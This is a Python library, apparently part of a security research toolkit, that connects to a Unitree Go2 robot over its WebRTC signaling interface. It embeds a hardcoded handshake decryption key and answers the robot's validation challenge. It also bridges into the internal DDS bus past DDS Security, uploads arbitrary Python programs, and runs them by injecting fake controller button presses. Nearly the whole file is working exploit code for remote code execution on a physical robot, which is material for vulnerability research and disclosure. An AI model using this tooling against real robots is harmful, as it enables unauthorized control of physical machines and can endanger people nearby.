"""
WebRTC data channel connection library for Unitree Go2.

Consolidates the signaling, crypto, and data channel code proven across
multiple PoC scripts into a reusable Go2DataChannel class.

Attack path: plaintext HTTP signaling (port 9991) -> WebRTC data channel
-> internal DDS bus (bypasses DDS Security via the WebRTC bridge).
"""

import asyncio
import base64
import binascii
import hashlib
import json
import logging
import random
import time
import uuid

import requests
from aiortc import RTCPeerConnection, RTCSessionDescription
import aiortc.rtcdtlstransport
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("unleash_lite.webrtc")

# Restrict to SHA-256 only. Multi-algorithm advertisement causes the Go2
# to use an incompatible SCTP framing mode.
aiortc.rtcdtlstransport.X509_DIGEST_ALGORITHMS = {"sha-256": hashes.SHA256()}

TIMEOUT = 12
DEFAULT_PORT = 9991

CON_NOTIFY_GCM_KEY = bytes([
    232, 86, 130, 189, 22, 84, 155, 0,
    142, 4, 166, 104, 43, 179, 235, 227,
])


# ---------------------------------------------------------------------------
# Signaling crypto
# ---------------------------------------------------------------------------

def _decrypt_gcm(encrypted_b64, key):
    data = base64.b64decode(encrypted_b64)
    tag, nonce, ct = data[-16:], data[-28:-16], data[:-28]
    return AESGCM(key).decrypt(nonce, ct + tag, None).decode()


def _calc_path_ending(data1):
    chars = list("ABCDEFGHIJ")
    last10 = data1[-10:]
    return "".join(
        str(chars.index(chunk[1]))
        for chunk in (last10[i:i+2] for i in range(0, 10, 2))
        if len(chunk) > 1 and chunk[1] in chars
    )


def _aes_encrypt(text, key):
    key_b = key.encode()
    pad = AES.block_size - len(text) % AES.block_size
    padded = (text + chr(pad) * pad).encode()
    return base64.b64encode(AES.new(key_b, AES.MODE_ECB).encrypt(padded)).decode()


def _aes_decrypt(enc_b64, key):
    key_b = key.encode()
    raw = AES.new(key_b, AES.MODE_ECB).decrypt(base64.b64decode(enc_b64))
    return raw[:-raw[-1]].decode()


def _rsa_encrypt(text, pubkey):
    cipher = PKCS1_v1_5.new(pubkey)
    max_c = pubkey.size_in_bytes() - 11
    data_b = text.encode()
    out = bytearray()
    for i in range(0, len(data_b), max_c):
        out.extend(cipher.encrypt(data_b[i:i+max_c]))
    return base64.b64encode(bytes(out)).decode()


def _aes_key():
    return binascii.hexlify(uuid.uuid4().bytes).decode()


def _validation_response(challenge_key):
    prefixed = f"UnitreeGo2_{challenge_key}"
    md5_hex = hashlib.md5(prefixed.encode()).hexdigest()
    return base64.b64encode(bytes.fromhex(md5_hex)).decode()


def _req_id():
    return int(time.time() * 1000) % 2147483648 + random.randint(0, 1000)


# ---------------------------------------------------------------------------
# Signaling (HTTP)
# ---------------------------------------------------------------------------

def handshake(robot_ip, port=DEFAULT_PORT, aes_128_key=None):
    url = f"http://{robot_ip}:{port}/con_notify"
    resp = requests.get(url, timeout=TIMEOUT)
    resp.raise_for_status()
    decoded = json.loads(base64.b64decode(resp.text).decode())
    data1 = decoded.get("data1", "")
    data2 = decoded.get("data2")
    if data2 == 2:
        data1 = _decrypt_gcm(data1, CON_NOTIFY_GCM_KEY)
    elif data2 == 3:
        if not aes_128_key:
            raise ConnectionError(
                "Robot uses per-device auth (data2=3, firmware >= 1.1.15). "
                "Pass --aes-key with the 32 hex-char device key.\n"
                "Retrieve it from the robot (/unitree/etc/key/aes_key.bin) "
                "or via the Unitree cloud API (device/bind/list)."
            )
        key = bytes.fromhex(aes_128_key)
        if len(key) != 16:
            raise ValueError("--aes-key must be exactly 32 hex characters (16 bytes)")
        data1 = _decrypt_gcm(data1, key)
    pubkey = RSA.import_key(base64.b64decode(data1[10:len(data1) - 10]))
    return data1, pubkey


def send_offer(robot_ip, data1, pubkey, sdp, port=DEFAULT_PORT):
    path = _calc_path_ending(data1)
    url = f"http://{robot_ip}:{port}/con_ing_{path}"
    payload = json.dumps({"id": "STA_localNetwork", "sdp": sdp,
                          "type": "offer", "token": ""})
    aes_key = _aes_key()
    body = {"data1": _aes_encrypt(payload, aes_key),
            "data2": _rsa_encrypt(aes_key, pubkey)}
    resp = requests.post(url, data=json.dumps(body),
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         timeout=TIMEOUT)
    if resp.status_code == 200 and resp.text:
        return json.loads(_aes_decrypt(resp.text, aes_key))
    return None


# ---------------------------------------------------------------------------
# Go2DataChannel
# ---------------------------------------------------------------------------

class Go2DataChannel:
    """WebRTC data channel connection to a Unitree Go2."""

    def __init__(self, robot_ip, port=DEFAULT_PORT, aes_128_key=None):
        self.robot_ip = robot_ip
        self.port = port
        self.aes_128_key = aes_128_key
        self._pc = None
        self._dc = None
        self._connected = asyncio.Event()
        self._first_msg = asyncio.Event()
        self._validated = asyncio.Event()
        self._responses = {}
        self._response_events = {}
        self._on_message_cb = None

    @property
    def is_connected(self):
        return self._connected.is_set()

    @property
    def is_validated(self):
        return self._validated.is_set()

    async def connect(self, timeout=15.0):
        """Full connection: ICE -> signaling -> DTLS/SCTP -> validation."""
        self._pc = RTCPeerConnection()
        self._dc = self._pc.createDataChannel("data")

        offer = await self._pc.createOffer()
        await self._pc.setLocalDescription(offer)
        for _ in range(60):
            if self._pc.iceGatheringState == "complete":
                break
            await asyncio.sleep(0.25)

        sdp = self._pc.localDescription.sdp
        logger.debug("ICE gathering: %s", self._pc.iceGatheringState)

        data1, pubkey = handshake(self.robot_ip, self.port, self.aes_128_key)
        answer_data = send_offer(self.robot_ip, data1, pubkey, sdp, self.port)
        if not answer_data:
            raise ConnectionError("Robot did not respond to WebRTC offer")

        answer_sdp = answer_data.get("sdp", "")
        if not answer_sdp:
            raise ConnectionError("Empty answer SDP from robot")

        self._setup_handlers()
        await self._pc.setRemoteDescription(
            RTCSessionDescription(sdp=answer_sdp, type="answer"))

        try:
            await asyncio.wait_for(self._connected.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            raise ConnectionError(
                "DTLS connection timed out. The robot may have an active "
                "WebRTC session (from the Unitree app). Close the app and retry.")

        try:
            await asyncio.wait_for(self._first_msg.wait(), timeout=10.0)
        except asyncio.TimeoutError:
            raise ConnectionError(
                "Data channel connected but no messages received")

        try:
            await asyncio.wait_for(self._validated.wait(), timeout=8.0)
        except asyncio.TimeoutError:
            logger.warning("Validation did not complete -- proceeding anyway")

    def _setup_handlers(self):
        dc = self._dc
        pc = self._pc

        @dc.on("open")
        def on_dc_open():
            self._connected.set()

        @dc.on("message")
        def on_message(raw):
            try:
                msg = json.loads(raw) if isinstance(raw, str) else json.loads(raw.decode())
            except Exception:
                return

            logger.debug("DC recv: %s", json.dumps(msg, indent=2)[:2000])
            self._first_msg.set()

            # Go2 never completes DCEP handshake -- force open so we can send
            if dc.readyState != "open":
                dc._setReadyState("open")

            msg_type = msg.get("type", "")
            data = msg.get("data", {})

            if msg_type == "validation":
                if data == "Validation Ok.":
                    logger.debug("Validation passed")
                    self._validated.set()
                else:
                    resp = _validation_response(str(data))
                    try:
                        dc.send(json.dumps({"type": "validation", "topic": "",
                                            "data": resp}))
                    except Exception as ex:
                        logger.error("Validation send error: %s", ex)

            elif msg_type in ("msg", "res"):
                if isinstance(data, dict):
                    rid = data.get("header", {}).get("identity", {}).get("id")
                    if rid and rid in self._response_events:
                        self._responses[rid] = data
                        self._response_events[rid].set()

            if self._on_message_cb:
                self._on_message_cb(msg)

        @pc.on("iceconnectionstatechange")
        def on_ice():
            if pc.iceConnectionState == "completed":
                self._connected.set()

        @pc.on("connectionstatechange")
        def on_conn():
            if pc.connectionState == "connected":
                self._connected.set()

    def on_message(self, callback):
        """Register a callback for all incoming data channel messages."""
        self._on_message_cb = callback

    async def subscribe(self, topic):
        self._dc.send(json.dumps({"type": "subscribe", "topic": topic}))

    async def send_request(self, topic, api_id, parameter="",
                           timeout=5.0):
        """Send a DDS API request and wait for the response."""
        rid = _req_id()
        if isinstance(parameter, dict):
            parameter = json.dumps(parameter)

        evt = asyncio.Event()
        self._response_events[rid] = evt

        req = {
            "header": {"identity": {"id": rid, "api_id": api_id}},
            "parameter": parameter,
        }
        msg = json.dumps({"type": "req", "topic": topic, "data": req})
        logger.debug("DC send: %s", msg[:2000])
        self._dc.send(msg)

        try:
            await asyncio.wait_for(evt.wait(), timeout=timeout)
            return self._responses.pop(rid, None)
        except asyncio.TimeoutError:
            self._response_events.pop(rid, None)
            return None

    async def upload_program(self, code, program_uuid=None, hotkey="L1+Y"):
        """Upload Python code via programming_actuator (api_id=1002).

        Returns (status_code, full_response) tuple.
        """
        if program_uuid is None:
            program_uuid = str(int(time.time()))

        await self.subscribe("rt/api/programming_actuator/response")
        await asyncio.sleep(0.3)

        payload = {
            "program_content": {
                "chunk_index": 1,
                "total_chunk_num": 1,
                "chunk_content": code,
            },
            "program_uuid": program_uuid,
            "bind_hotkey": hotkey,
        }

        logger.debug("upload_program request payload: %s",
                      json.dumps(payload, indent=2))

        resp = await self.send_request(
            "rt/api/programming_actuator/request",
            api_id=1002,
            parameter=payload,
        )

        logger.debug("upload_program raw response: %s",
                      json.dumps(resp, indent=2) if resp else "None")

        if resp is None:
            return -1, None

        code = resp.get("header", {}).get("status", {}).get("code", -1)
        return code, resp

    async def list_programs(self):
        """Query hotkey list via programming_actuator (api_id=1001).

        Returns (parsed_list, raw_response) tuple.
        """
        resp = await self.send_request(
            "rt/api/programming_actuator/request",
            api_id=1001,
            parameter="",
        )

        logger.debug("list_programs raw response: %s",
                      json.dumps(resp, indent=2) if resp else "None")

        if resp is None:
            return [], None

        data_str = resp.get("data", "")
        if isinstance(data_str, str) and data_str:
            try:
                parsed = json.loads(data_str)
                logger.debug("list_programs parsed data: %s",
                              json.dumps(parsed, indent=2))
                return parsed.get("hotkey_lists", []), resp
            except json.JSONDecodeError:
                logger.debug("list_programs data not JSON: %r", data_str)
        return [], resp

    # Button bitmask values from physical_remote_controller.py
    HOTKEY_KEYS = {
        "L1+Y": 2050,   # L1(2) + Y(2048)
        "L2+Y": 2080,   # L2(32) + Y(2048)
        "R1+Y": 2049,   # R1(1) + Y(2048)
    }

    async def trigger_hotkey(self, hotkey="L1+Y", hold_secs=0.4):
        """Send a fake controller button press via the data channel bridge.

        The WebRTC bridge forwards messages to rt/wirelesscontroller on
        the internal DDS bus, inside the DDS security perimeter.
        programming_actuator reads this topic and fires the bound script.
        No physical controller needed.
        """
        keys = self.HOTKEY_KEYS.get(hotkey)
        if keys is None:
            raise ValueError(
                f"Unknown hotkey {hotkey!r}. "
                f"Valid: {', '.join(self.HOTKEY_KEYS)}")

        logger.debug("Bridge trigger: %s (keys=%d)", hotkey, keys)
        wc = {"lx": 0.0, "ly": 0.0, "rx": 0.0, "ry": 0.0}

        # Button down
        self._dc.send(json.dumps({
            "type": "msg",
            "topic": "rt/wirelesscontroller",
            "data": {**wc, "keys": keys},
        }))
        await asyncio.sleep(hold_secs)
        # Button up
        self._dc.send(json.dumps({
            "type": "msg",
            "topic": "rt/wirelesscontroller",
            "data": {**wc, "keys": 0},
        }))
        logger.debug("Bridge trigger sent")

    async def close(self):
        if self._pc:
            await self._pc.close()
            self._pc = None
